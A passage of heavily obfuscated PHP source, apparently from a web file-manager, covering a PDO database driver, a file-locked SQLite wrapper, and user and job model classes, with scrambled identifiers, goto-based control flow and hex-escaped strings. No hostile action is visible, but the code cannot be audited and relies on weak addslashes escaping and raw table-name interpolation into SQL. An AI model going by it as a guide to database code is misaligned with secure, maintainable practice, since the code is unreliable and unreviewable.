$this->linkID[$A¸Î¸Úä“]->exec($E‰™ˆò¯Óš[843] . think_config($E‰™ˆò¯Óš[810])); $this->connected = !0; if (1 != think_config($E‰™ˆò¯Óš[18])) { unset($this->config); } goto B¸£Í·›å‡; B¸£Í·›å‡: } return $this->linkID[$A¸Î¸Úä“]; } public function free() { $this->PDOStatement = null; } public function query($fÏÁ ‘¤Á, $bí½ÌŒôˆ½ = array()) { goto A‰•ñ˜óÇ‚; EÒßÀé¾Ää: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $FÌ©ê“¬×õ = $this->PDOStatement->execute($bí½ÌŒôˆ½); $this->debug(); goto d¹„ÒÃ·’º; d¹„ÒÃ·’º: if (!1 === $FÌ©ê“¬×õ) { $this->error(); return !1; } else { return $this->getAll(); } goto FšÊ‡‡•‚›; A‰•ñ˜óÇ‚: $B“¨³µÃö† =& $_SERVER[¶ªÕß‚ØÁŸ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto C³íõñŠê; D‹Í˜ñ¢¬î: think_action_status($B“¨³µÃö†[19], 1); think_status($B“¨³µÃö†[20]); $this->PDOStatement = $this->_linkID->prepare($fÏÁ ‘¤Á); goto EÒßÀé¾Ää; C³íõñŠê: $this->queryStr = $fÏÁ ‘¤Á; if (!empty($bí½ÌŒôˆ½)) { $this->queryStr .= $B“¨³µÃö†[844] . print_r($bí½ÌŒôˆ½, !0) . $B“¨³µÃö†[845]; } if (!empty($this->PDOStatement)) { $this->free(); } goto D‹Í˜ñ¢¬î; FšÊ‡‡•‚›: } public function execute($aÆÙ•Ü×š, $F…¹äñŠÁ = array()) { goto BÈŠĞåæğÔ; a”ÍƒÕ†ò¼: $eö¤ƒÃäˆÀ = $this->PDOStatement->execute($F…¹äñŠÁ); $this->debug(); if (!1 === $eö¤ƒÃäˆÀ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($fÒê›‚îóÍ || preg_match($C°ö›¯–Ã†[850], $aÆÙ•Ü×š)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto CÜŒ‚©Û‰; cÌËø¯»”×: think_status($C°ö›¯–Ã†[20]); $this->PDOStatement = $this->_linkID->prepare($aÆÙ•Ü×š); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto a”ÍƒÕ†ò¼; D¢›‡©•ˆô: $this->queryStr = $aÆÙ•Ü×š; if (!empty($F…¹äñŠÁ)) { $this->queryStr .= $C°ö›¯–Ã†[844] . print_r($F…¹äñŠÁ, !0) . $C°ö›¯–Ã†[845]; } $fÒê›‚îóÍ = !1; goto dğ¨…—ºéÔ; BÈŠĞåæğÔ: $C°ö›¯–Ã† =& $_SERVER[¶ªÕß‚ØÁŸ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto D¢›‡©•ˆô; dğ¨…—ºéÔ: if ($this->dbType == $C°ö›¯–Ã†[838]) { if (preg_match($C°ö›¯–Ã†[846], $this->queryStr, $eÏÚÍÚèë·)) { $this->table = think_config($C°ö›¯–Ã†[847]) . str_ireplace(think_config($C°ö›¯–Ã†[848]), $C°ö›¯–Ã†[66], $eÏÚÍÚèë·[2]); $fÒê›‚îóÍ = (bool) $this->query($C°ö›¯–Ã†[849] . strtoupper($this->table) . $C°ö›¯–Ã†[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($C°ö›¯–Ã†[21], 1); goto cÌËø¯»”×; CÜŒ‚©Û‰: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $A‘‹¤ÂéØÉ = $this->_linkID->commit(); $this->transTimes = 0; if (!$A‘‹¤ÂéØÉ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $f Çº ïŞÍ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$f Çº ïŞÍ) { $this->error(); return !1; } } return !0; } private function getAll() { $c˜Èùº¦®‚ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($c˜Èùº¦®‚); return $c˜Èùº¦®‚; } public function getFields($Cê«³…’Šà) { goto a‹©¡£‚†¬; DµÀ‹ŠÛ¨ß: return $a×‰ŠõÌŠ‡; goto ağ‘ƒ÷›; Aá«—†ƒçà: $côàæ†£İ = $this->query($Aè¨Ì¨µ‘¼); $a×‰ŠõÌŠ‡ = array(); if ($côàæ†£İ) { foreach ($côàæ†£İ as $eÍÄÚòØØñ => $C®‚¤¥š¬Ä) { $C®‚¤¥š¬Ä = array_change_key_case($C®‚¤¥š¬Ä); $C®‚¤¥š¬Ä[$AÄíŒÔß×[28]] = isset($C®‚¤¥š¬Ä[$AÄíŒÔß×[28]]) ? $C®‚¤¥š¬Ä[$AÄíŒÔß×[28]] : $AÄíŒÔß×[66]; $C®‚¤¥š¬Ä[$AÄíŒÔß×[29]] = isset($C®‚¤¥š¬Ä[$AÄíŒÔß×[29]]) ? $C®‚¤¥š¬Ä[$AÄíŒÔß×[29]] : $AÄíŒÔß×[66]; $C¯â×Şëá¢ = isset($C®‚¤¥š¬Ä[$AÄíŒÔß×[270]]) ? $C®‚¤¥š¬Ä[$AÄíŒÔß×[270]] : $C®‚¤¥š¬Ä[$AÄíŒÔß×[28]]; $a×‰ŠõÌŠ‡[$C¯â×Şëá¢] = array($AÄíŒÔß×[28] => $C¯â×Şëá¢, $AÄíŒÔß×[29] => $C®‚¤¥š¬Ä[$AÄíŒÔß×[29]], $AÄíŒÔß×[31] => (bool) (isset($C®‚¤¥š¬Ä[$AÄíŒÔß×[109]]) && $C®‚¤¥š¬Ä[$AÄíŒÔß×[109]] === $AÄíŒÔß×[33] || isset($C®‚¤¥š¬Ä[$AÄíŒÔß×[31]]) && $C®‚¤¥š¬Ä[$AÄíŒÔß×[31]] === $AÄíŒÔß×[33]), $AÄíŒÔß×[34] => isset($C®‚¤¥š¬Ä[$AÄíŒÔß×[34]]) ? $C®‚¤¥š¬Ä[$AÄíŒÔß×[34]] : (isset($C®‚¤¥š¬Ä[$AÄíŒÔß×[53]]) ? $C®‚¤¥š¬Ä[$AÄíŒÔß×[53]] : $AÄíŒÔß×[66]), $AÄíŒÔß×[36] => isset($C®‚¤¥š¬Ä[$AÄíŒÔß×[99]]) ? strtolower($C®‚¤¥š¬Ä[$AÄíŒÔß×[99]]) == $AÄíŒÔß×[38] : (isset($C®‚¤¥š¬Ä[$AÄíŒÔß×[54]]) ? $C®‚¤¥š¬Ä[$AÄíŒÔß×[54]] : !1), $AÄíŒÔß×[39] => isset($C®‚¤¥š¬Ä[$AÄíŒÔß×[867]]) ? strtolower($C®‚¤¥š¬Ä[$AÄíŒÔß×[867]]) == $AÄíŒÔß×[41] : (isset($C®‚¤¥š¬Ä[$AÄíŒÔß×[99]]) ? $C®‚¤¥š¬Ä[$AÄíŒÔß×[99]] : !1)); } } goto DµÀ‹ŠÛ¨ß; a‹©¡£‚†¬: $AÄíŒÔß× =& $_SERVER[¶ªÕß‚ØÁŸ]; $this->initConnect(!0); if (think_config($AÄíŒÔß×[851])) { $Aè¨Ì¨µ‘¼ = str_replace($AÄíŒÔß×[852], $Cê«³…’Šà, think_config($AÄíŒÔß×[851])); } else { switch ($this->dbType) { case $AÄíŒÔß×[835]: case $AÄíŒÔß×[853]: $Aè¨Ì¨µ‘¼ = "\x53\105\x4c\x45\x43\124\40\x20\x20\143\157\x6c\165\155\x6e\137\x6e\x61\155\145\40\141\163\x20\47\116\x61\155\145\47\x2c\40\40\40\144\x61\164\141\137\164\x79\x70\145\x20\x61\163\x20\x27\x54\x79\x70\x65\x27\54\x20\40\40\x63\x6f\x6c\165\155\x6e\137\x64\145\x66\x61\165\154\164\x20\141\163\40\x27\104\145\146\x61\x75\154\164\47\x2c\x20\40\40\x69\x73\x5f\x6e\165\x6c\154\141\142\x6c\145\40\x61\163\40\47\x4e\165\x6c\x6c\x27\xa\x9\11\x46\x52\x4f\x4d\11\151\156\146\157\162\155\141\164\x69\x6f\x6e\x5f\163\143\150\145\155\141\x2e\164\141\x62\154\145\163\x20\x41\123\x20\x74\xa\x9\11\x4a\x4f\111\116\x9\151\156\146\x6f\x72\x6d\x61\164\x69\157\x6e\x5f\163\143\x68\145\x6d\141\x2e\x63\157\x6c\165\155\x6e\163\40\x41\123\x20\x63\xa\11\11\117\116\40\40\164\x2e\164\x61\142\154\145\137\143\141\164\141\x6c\x6f\147\40\x3d\40\143\56\x74\x61\x62\154\145\137\x63\x61\164\141\154\157\x67\12\11\11\101\116\x44\x20\164\56\x74\x61\x62\x6c\145\137\163\x63\x68\x65\155\141\x20\x3d\40\143\x2e\x74\141\142\154\x65\137\163\x63\x68\145\155\141\12\11\x9\x41\x4e\x44\x20\x74\x2e\x74\x61\x62\154\145\137\156\141\155\x65\x20\75\x20\143\x2e\x74\141\142\x6c\x65\137\156\x61\155\145\xa\x9\11\x57\x48\105\122\105\40\x20\40\x74\x2e\164\x61\142\154\x65\x5f\156\x61\155\145\x20\75\x20\x27{$Cê«³…’Šà}\47"; break; case $AÄíŒÔß×[854]: $Aè¨Ì¨µ‘¼ = $AÄíŒÔß×[855] . $Cê«³…’Šà . $AÄíŒÔß×[856]; break; case $AÄíŒÔß×[836]: case $AÄíŒÔß×[838]: $Aè¨Ì¨µ‘¼ = $AÄíŒÔß×[857] . $AÄíŒÔß×[858] . $AÄíŒÔß×[859] . strtoupper($Cê«³…’Šà) . $AÄíŒÔß×[860] . strtoupper($Cê«³…’Šà) . $AÄíŒÔß×[861]; break; case $AÄíŒÔß×[862]: $Aè¨Ì¨µ‘¼ = $AÄíŒÔß×[863] . $Cê«³…’Šà . $AÄíŒÔß×[864]; break; case $AÄíŒÔß×[837]: break; case $AÄíŒÔß×[865]: default: $Aè¨Ì¨µ‘¼ = $AÄíŒÔß×[866] . ($this->dbType == $AÄíŒÔß×[865] ? "\x60{$Cê«³…’Šà}\x60" : $Cê«³…’Šà); } } goto Aá«—†ƒçà; ağ‘ƒ÷›: } public function getTables($có¥ñÆó¸à = '') { $d¢‹ì±…„ˆ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (think_config($d¢‹ì±…„ˆ[868])) { $B¡¡îÌìÔ· = str_replace($d¢‹ì±…„ˆ[869], $có¥ñÆó¸à, think_config($d¢‹ì±…„ˆ[868])); } else { switch ($this->dbType) { case $d¢‹ì±…„ˆ[836]: case $d¢‹ì±…„ˆ[838]: $B¡¡îÌìÔ· = $d¢‹ì±…„ˆ[870]; break; case $d¢‹ì±…„ˆ[835]: case $d¢‹ì±…„ˆ[853]: $B¡¡îÌìÔ· = $d¢‹ì±…„ˆ[871]; break; case $d¢‹ì±…„ˆ[862]: $B¡¡îÌìÔ· = $d¢‹ì±…„ˆ[872]; break; case $d¢‹ì±…„ˆ[837]: think_exception(think_lang($d¢‹ì±…„ˆ[873]) . $d¢‹ì±…„ˆ[874]); break; case $d¢‹ì±…„ˆ[854]: $B¡¡îÌìÔ· = $d¢‹ì±…„ˆ[42] . $d¢‹ì±…„ˆ[43] . $d¢‹ì±…„ˆ[44]; break; case $d¢‹ì±…„ˆ[865]: default: if (!empty($có¥ñÆó¸à)) { $B¡¡îÌìÔ· = $d¢‹ì±…„ˆ[818] . $có¥ñÆó¸à; } else { $B¡¡îÌìÔ· = $d¢‹ì±…„ˆ[819]; } } } $BÏ¼¥‰Ö– = $this->query($B¡¡îÌìÔ·); $AÄøù¦Ö¶š = array(); foreach ($BÏ¼¥‰Ö– as $EÈ³­ïîìí => $d„à‡‚¦Ó™) { $AÄøù¦Ö¶š[$EÈ³­ïîìí] = current($d„à‡‚¦Ó™); } return $AÄøù¦Ö¶š; } protected function parseLimit($Bé¸â¿æğÑ) { $DÓñ¥‡¨ù‰ =& $_SERVER[¶ªÕß‚ØÁŸ]; $aÙâŠğÓ™ = $DÓñ¥‡¨ù‰[33]; if (!empty($Bé¸â¿æğÑ)) { switch ($this->dbType) { case $DÓñ¥‡¨ù‰[862]: case $DÓñ¥‡¨ù‰[854]: $Bé¸â¿æğÑ = explode($DÓñ¥‡¨ù‰[47], $Bé¸â¿æğÑ); if (count($Bé¸â¿æğÑ) > 1) { $aÙâŠğÓ™ .= $DÓñ¥‡¨ù‰[48] . $Bé¸â¿æğÑ[1] . $DÓñ¥‡¨ù‰[49] . $Bé¸â¿æğÑ[0] . $DÓñ¥‡¨ù‰[50]; } else { $aÙâŠğÓ™ .= $DÓñ¥‡¨ù‰[48] . $Bé¸â¿æğÑ[0] . $DÓñ¥‡¨ù‰[50]; } break; case $DÓñ¥‡¨ù‰[835]: case $DÓñ¥‡¨ù‰[853]: break; case $DÓñ¥‡¨ù‰[837]: break; case $DÓñ¥‡¨ù‰[836]: case $DÓñ¥‡¨ù‰[838]: break; case $DÓñ¥‡¨ù‰[865]: default: $aÙâŠğÓ™ .= $DÓñ¥‡¨ù‰[48] . $Bé¸â¿æğÑ . $DÓñ¥‡¨ù‰[50]; } } return $aÙâŠğÓ™; } public function parseKey(&$B‚ˆáÉË, $C¯ë±Ø­™ = true) { $C¸ÎÊíª… =& $_SERVER[¶ªÕß‚ØÁŸ]; if ($C¯ë±Ø­™) { $B‚ˆáÉË = $this->parseKeyCheck($B‚ˆáÉË); } if ($this->dbType == $C¸ÎÊíª…[865]) { if ($B‚ˆáÉË != $C¸ÎÊíª…[186] && !preg_match($C¸ÎÊíª…[829], $B‚ˆáÉË)) { $B‚ˆáÉË = $C¸ÎÊíª…[830] . trim($B‚ˆáÉË, $C¸ÎÊíª…[830]) . $C¸ÎÊíª…[830]; } return $B‚ˆáÉË; } else { return parent::parseKey($B‚ˆáÉË); } } public function close() { $this->_linkID = null; } public function error() { $fÅà Í² =& $_SERVER[¶ªÕß‚ØÁŸ]; if ($this->PDOStatement) { $Báİ×¢ë›„ = $this->PDOStatement->errorInfo(); $this->error = $Báİ×¢ë›„[1] . $fÅà Í²[4] . $Báİ×¢ë›„[2]; } else { $this->error = $fÅà Í²[33]; } if ($fÅà Í²[33] != $this->queryStr) { $this->error .= LNG($fÅà Í²[45]) . $this->queryStr; } think_trace($this->error, $fÅà Í²[33], $fÅà Í²[46]); return $this->error; } public function escapeString($dŞµÇ£Î×Ë) { $f¸ê¾ˆÇ‚ˆ =& $_SERVER[¶ªÕß‚ØÁŸ]; switch ($this->dbType) { case $f¸ê¾ˆÇ‚ˆ[862]: case $f¸ê¾ˆÇ‚ˆ[835]: case $f¸ê¾ˆÇ‚ˆ[853]: case $f¸ê¾ˆÇ‚ˆ[865]: return addslashes($dŞµÇ£Î×Ë); case $f¸ê¾ˆÇ‚ˆ[837]: case $f¸ê¾ˆÇ‚ˆ[854]: case $f¸ê¾ˆÇ‚ˆ[836]: case $f¸ê¾ˆÇ‚ˆ[838]: return str_ireplace($f¸ê¾ˆÇ‚ˆ[55], $f¸ê¾ˆÇ‚ˆ[56], $dŞµÇ£Î×Ë); } } protected function parseValue($bùãöõš¦¤) { $c‰æäéŒ·½ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (is_string($bùãöõš¦¤)) { $bùãöõš¦¤ = strpos($bùãöõš¦¤, $c‰æäéŒ·½[4]) === 0 ? $this->escapeString($bùãöõš¦¤) : $c‰æäéŒ·½[875] . $this->escapeString($bùãöõš¦¤) . $c‰æäéŒ·½[875]; } elseif (isset($bùãöõš¦¤[0]) && is_string($bùãöõš¦¤[0]) && strtolower($bùãöõš¦¤[0]) == $c‰æäéŒ·½[294]) { $bùãöõš¦¤ = $this->escapeString($bùãöõš¦¤[1]); } elseif (is_array($bùãöõš¦¤)) { $bùãöõš¦¤ = array_map(array($this, $c‰æäéŒ·½[876]), $bùãöõš¦¤); } elseif (is_bool($bùãöõš¦¤)) { $bùãöõš¦¤ = $bùãöõš¦¤ ? $c‰æäéŒ·½[93] : $c‰æäéŒ·½[476]; } elseif (is_null($bùãöõš¦¤)) { $bùãöõš¦¤ = $c‰æäéŒ·½[109]; } return $bùãöõš¦¤; } public function getLastInsertId() { $D¾ñŠ‘Êµˆ =& $_SERVER[¶ªÕß‚ØÁŸ]; switch ($this->dbType) { case $D¾ñŠ‘Êµˆ[862]: case $D¾ñŠ‘Êµˆ[854]: case $D¾ñŠ‘Êµˆ[835]: case $D¾ñŠ‘Êµˆ[853]: case $D¾ñŠ‘Êµˆ[837]: case $D¾ñŠ‘Êµˆ[865]: return $this->_linkID->lastInsertId(); case $D¾ñŠ‘Êµˆ[836]: case $D¾ñŠ‘Êµˆ[838]: $CŸ¨Å‰‘ñ = $this->table; $c÷¸âÜ†» = $this->query("\123\105\x4c\105\103\124\x20{$CŸ¨Å‰‘ñ}\x2e\143\165\162\162\x76\141\154\40\143\x75\x72\162\166\x61\x6c\x20\x46\x52\117\x4d\40\x64\x75\141\x6c"); return $c÷¸âÜ†» ? $c÷¸âÜ†»[0][$D¾ñŠ‘Êµˆ[877]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($DÑÑŸÁäô´) { goto cˆÖµ” ; d‚ó…”öÂÛ: fclose($aÈÎùñ…Àğ); show_json($cÚÇ­ä•¥[880], !1); return !1; goto EßËâƒÙ’ß; cˆÖµ” : $cÚÇ­ä•¥ =& $_SERVER[¶ªÕß‚ØÁŸ]; $bŸã¦›åäÀ = DATA_PATH . $cÚÇ­ä•¥[878]; $aÈÎùñ…Àğ = fopen($bŸã¦›åäÀ, $cÚÇ­ä•¥[879]); goto bÙ‘®Çæ¨Ü; bÙ‘®Çæ¨Ü: if (!$aÈÎùñ…Àğ) { return !1; } if (flock($aÈÎùñ…Àğ, LOCK_EX)) { $e­Ì¿Ë…¹© = parent::query($DÑÑŸÁäô´); flock($aÈÎùñ…Àğ, LOCK_UN); fclose($aÈÎùñ…Àğ); return $e­Ì¿Ë…¹©; } flock($aÈÎùñ…Àğ, LOCK_UN); goto d‚ó…”öÂÛ; EßËâƒÙ’ß: } public function execute($e†„èâ§ ğ) { goto bÓ‘÷ˆ›É¶; bÓ‘÷ˆ›É¶: $Bğï„Ÿ‹ïÙ =& $_SERVER[¶ªÕß‚ØÁŸ]; $CŞß²ÑÏÛ› = DATA_PATH . $Bğï„Ÿ‹ïÙ[878]; $c«ò¿Œ®Âº = fopen($CŞß²ÑÏÛ›, $Bğï„Ÿ‹ïÙ[879]); goto fÈáçËªĞ¼; b‡ó¯»÷’: fclose($c«ò¿Œ®Âº); show_json($Bğï„Ÿ‹ïÙ[880], !1); return !1; goto c¨´ƒè…ô; fÈáçËªĞ¼: if (!$c«ò¿Œ®Âº) { return !1; } if (flock($c«ò¿Œ®Âº, LOCK_EX)) { $eàöÓöãœÁ = parent::execute($e†„èâ§ ğ); flock($c«ò¿Œ®Âº, LOCK_UN); fclose($c«ò¿Œ®Âº); return $eàöÓöãœÁ; } flock($c«ò¿Œ®Âº, LOCK_UN); goto b‡ó¯»÷’; c¨´ƒè…ô: } } goto EİÍÉè¿; f®«îËÔ’: class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\x6d\56\x6a\157\x62\114\151\x73\164"; public $field = array("\x6e\x61\155\x65", "\144\x65\163\143", "\x73\157\162\x74"); const JOB_KEY = "\163\145\x6c\146\112\x6f\142\114\151\x73\164"; public function listData($c¸‡¬öà = false, $c­·ÚéÇ„‹ = "\163\157\162\x74", $AååÚÅ‘ğ = false) { return parent::listData($c¸‡¬öà, $c­·ÚéÇ„‹, $AååÚÅ‘ğ); } public function remove($E¨£”‘˜îæ) { return parent::remove($E¨£”‘˜îæ); } public function add($FÚ°Ë‡¹¶) { $e‡ÆšµÈäÀ =& $_SERVER[¶ªÕß‚ØÁŸ]; if ($this->findByName($FÚ°Ë‡¹¶[$e‡ÆšµÈäÀ[28]])) { return !1; } $FÚ°Ë‡¹¶[$e‡ÆšµÈäÀ[2128]] = $this->getSort(); return parent::insert($FÚ°Ë‡¹¶); } private function getSort() { $eõ¡¶Š©ö =& $_SERVER[¶ªÕß‚ØÁŸ]; $B—ĞÚ²ˆ§ = parent::listData(); $aÄîÚ‰–Ø = array_to_keyvalue($B—ĞÚ²ˆ§, $eõ¡¶Š©ö[33], $eõ¡¶Š©ö[2128]); return empty($aÄîÚ‰–Ø) ? 0 : max($aÄîÚ‰–Ø) + 1; } public function update($aïÍº·‹„œ, $Fèëëî¹ …) { $EëÊˆ˜É =& $_SERVER[¶ªÕß‚ØÁŸ]; $Aè´ÍšíØ = parent::listData($aïÍº·‹„œ); $cÁµÒ‰ğ¨¨ = $this->findByName($Fèëëî¹ …[$EëÊˆ˜É[28]]); if (!$Aè´ÍšíØ || $cÁµÒ‰ğ¨¨ && $cÁµÒ‰ğ¨¨[$EëÊˆ˜É[375]] != $Aè´ÍšíØ[$EëÊˆ˜É[375]]) { return !1; } return parent::update($aïÍº·‹„œ, $Fèëëî¹ …); } public function setUserJob($fˆÇŸÌøÀÇ, $DÚƒ·¤Ë¼°) { goto BÜ¨ª”Ë¾Ò; f¾éø¿í‘: $fªÍ½¹„½í = rtrim($fªÍ½¹„½í, $cŸ•ô•²ªŞ[47]); Model($cŸ•ô•²ªŞ[485])->metaSet($fˆÇŸÌøÀÇ, self::JOB_KEY, $fªÍ½¹„½í); goto A®Öµ”£; BÜ¨ª”Ë¾Ò: $cŸ•ô•²ªŞ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!is_array($DÚƒ·¤Ë¼°)) { $DÚƒ·¤Ë¼° = array($DÚƒ·¤Ë¼°); } $AÌİº—æëÑ = parent::listData(); goto AƒìÕŞ”™; AƒìÕŞ”™: $Ağä’¾µó = array_to_keyvalue($AÌİº—æëÑ, $cŸ•ô•²ªŞ[28]); $fªÍ½¹„½í = $cŸ•ô•²ªŞ[66]; foreach ($DÚƒ·¤Ë¼° as $cØ­ç¸Ü˜é) { if ($Ağä’¾µó[$cØ­ç¸Ü˜é]) { $fªÍ½¹„½í .= $Ağä’¾µó[$cØ­ç¸Ü˜é][$cŸ•ô•²ªŞ[375]] . $cŸ•ô•²ªŞ[47]; } else { $AÏâ£Ä…×£ = $this->add($cØ­ç¸Ü˜é); $fªÍ½¹„½í .= $AÏâ£Ä…×£ . $cŸ•ô•²ªŞ[47]; } } goto f¾éø¿í‘; A®Öµ”£: } public function getUserJob($FŠÙß¦ÛšŒ) { $CšœÛ›¬³ = Model($_SERVER[¶ªÕß‚ØÁŸ][485])->metaGet($FŠÙß¦ÛšŒ); return $this->getUserJobInfo($CšœÛ›¬³[self::JOB_KEY]); } public function getUserJobInfo($C…ÛŸìÎËœ) { goto c«ƒÛÒ ´œ; C˜»öƒ´Ïé: return $DäñÄÏõè‰; goto A“²Îœ…õ; c«ƒÛÒ ´œ: $EÓ‰“ßÅßÔ =& $_SERVER[¶ªÕß‚ØÁŸ]; $BŒŒ©Ö™¦Ì = explode($EÓ‰“ßÅßÔ[47], $C…ÛŸìÎËœ); $A¿Åáš£¾ = parent::listData(); goto F¿ºá»Ú±; F¿ºá»Ú±: $A¿Åáš£¾ = array_remove_key($A¿Åáš£¾, $EÓ‰“ßÅßÔ[197]); $DäñÄÏõè‰ = array(); foreach ($BŒŒ©Ö™¦Ì as $FÃÓ”Ÿ®Ø) { if (isset($A¿Åáš£¾[$FÃÓ”Ÿ®Ø])) { $DäñÄÏõè‰[] = $A¿Åáš£¾[$FÃÓ”Ÿ®Ø]; } } goto C˜»öƒ´Ïé; A“²Îœ…õ: } } class UserModel extends ModelBase { protected $tableName = "\x75\163\x65\162"; protected $tableMeta = array("\164\141\x62\x6c\x65\116\141\155\x65" => "\165\163\x65\x72\x5f\x6d\x65\164\x61", "\x6d\x65\x74\x61\106\x69\x65\154\x64" => "\165\163\x65\162\x49\104"); protected $simpleField = "\x75\163\x65\162\111\104\54\x6e\x69\143\153\x4e\x61\x6d\x65\x2c\x6e\x61\155\145\54\x61\x76\141\x74\141\x72\x2c\163\145\x78"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($aÂ¯Œê¥šñ) { $f´š¾»ŸŸ =& $_SERVER[¶ªÕß‚ØÁŸ]; $Aœ§áÀÑÍÇ = $f´š¾»ŸŸ[2499]; return array($f´š¾»ŸŸ[2173] => array($aÂ¯Œê¥šñ[0], $Aœ§áÀÑÍÇ), $f´š¾»ŸŸ[2175] => array($aÂ¯Œê¥šñ[0], $Aœ§áÀÑÍÇ), $f´š¾»ŸŸ[2500] => array($aÂ¯Œê¥šñ[0], $Aœ§áÀÑÍÇ)); } protected function getInfo($B÷¢Ê½ğä³, $fèëË±¥ëª = false) { $f·Õ‘¦©ëğ = $this->getInfoSimple($B÷¢Ê½ğä³); if (!is_array($f·Õ‘¦©ëğ)) { return array(); } if ($fèëË±¥ëª) { return $this->_getInfoApply($f·Õ‘¦©ëğ); } return $this->cacheFunctionGet($_SERVER[¶ªÕß‚ØÁŸ][2215], $B÷¢Ê½ğä³); } protected function getInfoFull($Bì£Õ’æ, $BÁ‰–°õØ = false) { $D­à¿’Àï‡ = $this->getInfoSimple($Bì£Õ’æ); if (!is_array($D­à¿’Àï‡)) { return array(); } if ($BÁ‰–°õØ) { return $this->_getInfoApply($D­à¿’Àï‡, !0); return $this->_getInfoApply($D­à¿’Àï‡, !0); } return $this->cacheFunctionGet($_SERVER[¶ªÕß‚ØÁŸ][2501], $Bì£Õ’æ); } private function _getInfoApply($fˆ•“À¬­«, $cƒ¼Ü•£Ü = false) { goto d½æåŞÒ·; DŸİù½ÅĞ: $fˆ•“À¬­«[$eñˆ’ß…æ[399]][$eñˆ’ß…æ[2332]] = isset($E¤¥˜®ï£[$eñˆ’ß…æ[2333]]) ? $E¤¥˜®ï£[$eñˆ’ß…æ[2333]] : null; if ($cƒ¼Ü•£Ü) { $fˆ•“À¬­«[$eñˆ’ß…æ[425]] = $this->metaGet($fˆ•“À¬­«[$eñˆ’ß…æ[1440]]); } return $fˆ•“À¬­«; goto d’·ĞŒ™Œİ; A²Ø©Ø¬÷·: $fˆ•“À¬­« = $this->_listDataApplyItem($fˆ•“À¬­«); $E¤¥˜®ï£ = Model($eñˆ’ß…æ[1121])->metaGet($fˆ•“À¬­«[$eñˆ’ß…æ[399]][$eñˆ’ß…æ[377]]); $fˆ•“À¬­«[$eñˆ’ß…æ[2504]] = $DíĞ¯ïËÚ„; goto DŸİù½ÅĞ; d½æåŞÒ·: $eñˆ’ß…æ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$fˆ•“À¬­«) { return $fˆ•“À¬­«; } $DíĞ¯ïËÚ„ = md5($eñˆ’ß…æ[2502] . $fˆ•“À¬­«[$eñˆ’ß…æ[808]] . $eñˆ’ß…æ[2503] . $fˆ•“À¬­«[$eñˆ’ß…æ[28]]); goto A²Ø©Ø¬÷·; d’·ĞŒ™Œİ: } protected function getInfoSimple($F‹è½Ì”’‰, $b½¬¶ÓÉğ£ = false) { $F³ĞéÒ›ì =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$F‹è½Ì”’‰) { return array(); } if ($b½¬¶ÓÉğ£) { $dğ‹âÚ´Œ = $this->where(array($F³ĞéÒ›ì[1440] => intval($F‹è½Ì”’‰)))->find(); if (!is_array($dğ‹âÚ´Œ)) { return array(); } $dğ‹âÚ´Œ[$F³ĞéÒ›ì[2505]] = Action($F³ĞéÒ›ì[2506])->parseUrl($dğ‹âÚ´Œ[$F³ĞéÒ›ì[2505]]); return $dğ‹âÚ´Œ; } return $this->cacheFunctionGet($F³ĞéÒ›ì[2176], $F‹è½Ì”’‰); } protected function getInfoSimpleOuter($D¡ì¨‡„ø¶) { goto b¹Ï“›ªœ‹; b´³á¾œŒ¡: return $f‰ßà¨ã—; goto DïõÍˆ‰; AùÒÊ¸Î¸»: $f‰ßà¨ã— = array_field_key($c¶åÍ¥ÚÒ¦, explode($aó½Å µ„Ÿ[47], $this->simpleField)); if (!$f‰ßà¨ã—) { return array($aó½Å µ„Ÿ[1440] => $aó½Å µ„Ÿ[1035], $aó½Å µ„Ÿ[28] => $aó½Å µ„Ÿ[167] . LNG($aó½Å µ„Ÿ[2509]) . $aó½Å µ„Ÿ[484], $aó½Å µ„Ÿ[2505] => STATIC_PATH . $aó½Å µ„Ÿ[2510]); } $f‰ßà¨ã—[$aó½Å µ„Ÿ[2505]] = Action($aó½Å µ„Ÿ[2506])->parseUrl($f‰ßà¨ã—[$aó½Å µ„Ÿ[2505]]); goto b´³á¾œŒ¡; b¹Ï“›ªœ‹: $aó½Å µ„Ÿ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$D¡ì¨‡„ø¶ || $D¡ì¨‡„ø¶ == 0) { return array($aó½Å µ„Ÿ[1440] => $aó½Å µ„Ÿ[476], $aó½Å µ„Ÿ[28] => $aó½Å µ„Ÿ[167] . LNG($aó½Å µ„Ÿ[2507]) . $aó½Å µ„Ÿ[484], $aó½Å µ„Ÿ[2505] => STATIC_PATH . $aó½Å µ„Ÿ[2508]); } $c¶åÍ¥ÚÒ¦ = $this->cacheFunctionGet($aó½Å µ„Ÿ[2176], $D¡ì¨‡„ø¶); goto AùÒÊ¸Î¸»; DïõÍˆ‰: } protected function groupUser($bµİğœ¹) { } public static function errorLang($fÊéª¥Çª) { $f«ÊŠØÆ =& $_SERVER[¶ªÕß‚ØÁŸ]; $D³Œ’ˆªÑñ = array(self::ERROR_USER_NOT_EXISTS => $f«ÊŠØÆ[2511], self::ERROR_USER_PASSWORD_ERROR => 